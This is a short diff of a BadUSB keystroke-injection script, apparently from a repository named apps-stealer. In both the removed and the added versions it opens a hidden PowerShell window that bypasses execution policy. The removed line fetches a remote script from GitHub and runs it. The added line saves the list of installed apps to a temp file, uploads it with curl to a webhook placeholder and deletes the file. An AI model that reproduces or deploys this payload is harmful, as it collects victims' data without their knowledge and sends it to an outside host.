@@ -3,5 +3,4 @@ REM by SuperJakov
 REM switch 'WEBHOOK_HERE' with your webhook
 GUI r 
 DELAY 500
-STRING powershell -NoP -w h -ep bypass  $dc='WEBHOOK_HERE';irm https://raw.githubusercontent.com/SuperJakov/Badusb/main/apps-stealer/apps-stealer.ps1 | iex
-ENTER
+STRINGLN powershell -NoP -w h -ep bypass  $dc='WEBHOOK_HERE';Get-AppxPackage|Out-File $path="$env:TEMP\a.txt";curl -F "file1=@$path" $dc;rm $path -Force
